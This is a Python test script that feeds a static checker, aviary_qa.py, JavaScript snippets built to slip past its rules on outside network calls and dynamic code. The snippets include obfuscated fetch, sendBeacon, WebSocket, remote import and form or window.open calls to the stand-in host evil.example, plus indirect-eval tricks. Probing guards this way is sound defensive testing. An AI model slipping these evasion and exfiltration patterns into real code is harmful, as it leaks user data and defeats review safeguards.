"""Engineer's adversarial probe of aviary_qa.py (kit 1.1.0): try to get forbidden behaviour past Q08 (network outside the
ports file), Q09 (dynamic code) and related rules, the way the E16 cheat suite probes our guards.
Reuses the kit self-test's own fixture module "zz". Synthetic data only."""
import json, os, shutil, subprocess, sys, tempfile
HERE = sys.argv[1]  # kit scripts folder (copy)
sys.path.insert(0, HERE)
import selftest as st  # noqa: E402

PROBES = [
    # (expected rule, description, code added to zz.js)
    ("Q08", "fetch via computed property: window['fe'+'tch']", "window['fe' + 'tch']('https://evil.example/');\n"),
    ("Q08", "fetch via globalThis bracket", "globalThis['fetch']('https://evil.example/');\n"),
    ("Q08", "fetch through an alias variable", "var zzF = self['fetch']; zzF('https://evil.example/');\n"),
    ("Q08", "navigator.sendBeacon", "navigator.sendBeacon('https://evil.example/', 'x');\n"),
    ("Q08", "XMLHttpRequest", "var zzX = new XMLHttpRequest(); zzX.open('GET', 'https://evil.example/'); zzX.send();\n"),
    ("Q08", "WebSocket", "var zzW = new WebSocket('wss://evil.example/');\n"),
    ("Q08", "EventSource", "var zzE = new EventSource('https://evil.example/s');\n"),
    ("Q08", "dynamic import of a remote module", "import('https://evil.example/m.js');\n"),
    ("Q08", "image element created by createElement", "var zzI = document.createElement('img'); zzI.src = 'https://evil.example/p.gif';\n"),
    ("Q08", "URL assembled from parts at run time", "var zzU = 'ht' + 'tps:' + '//evil.example/'; fetch(zzU);\n"),
    ("Q08", "window.open to carry data away", "window.open('https://evil.example/?d=' + zzHtml);\n"),
    ("Q08", "form submit to an outside address", "var zzFo = document.createElement('form'); zzFo.action = 'https://evil.example/'; zzFo.submit();\n"),
    ("Q09", "eval through a computed name", "window['ev' + 'al']('1');\n"),
    ("Q09", "setTimeout with a code string", "setTimeout('alert(1)', 0);\n"),
    ("Q09", "constructor of a constructor", "[].constructor.constructor('return 1')();\n"),
    ("Q09", "indirect eval (0, eval)", "(0, eval)('1');\n"),
]


def main():
    tmp = tempfile.mkdtemp(prefix="bypass-")
    kit = os.path.join(tmp, "kit")
    shutil.copytree(os.path.dirname(HERE), kit, ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
    with open(os.path.join(kit, "scripts", "modules.json"), "w") as f:
        json.dump(st.MODULES, f)
    check = os.path.join(kit, "scripts", "aviary_qa.py")
    base = os.path.join(tmp, "base"); st.write(base, st.BASE)
    private = os.path.join(tmp, "private.txt"); open(private, "w").write("Zebedee\n")
    caught = 0
    for i, (rule, what, code) in enumerate(PROBES):
        root = os.path.join(tmp, f"p{i}")
        files = dict(st.COPY); files["zz.js"] = files["zz.js"] + code
        st.write(root, files)
        r = subprocess.run([sys.executable, "-I", check, root, "--base", base, "--results", os.path.join(root, "results.txt"), "--private", private],
                           capture_output=True, text=True, timeout=120)
        failed_rules = sorted({l.split()[1] for l in r.stdout.splitlines() if l.startswith("FAIL ")})
        ok = r.returncode != 0 and failed_rules
        caught += bool(ok)
        print(f"{'CAUGHT' if ok else 'MISSED'}  {what:55s} exit={r.returncode} failed={failed_rules}")
    print(f"\n{caught}/{len(PROBES)} probes caught")
    shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    main()
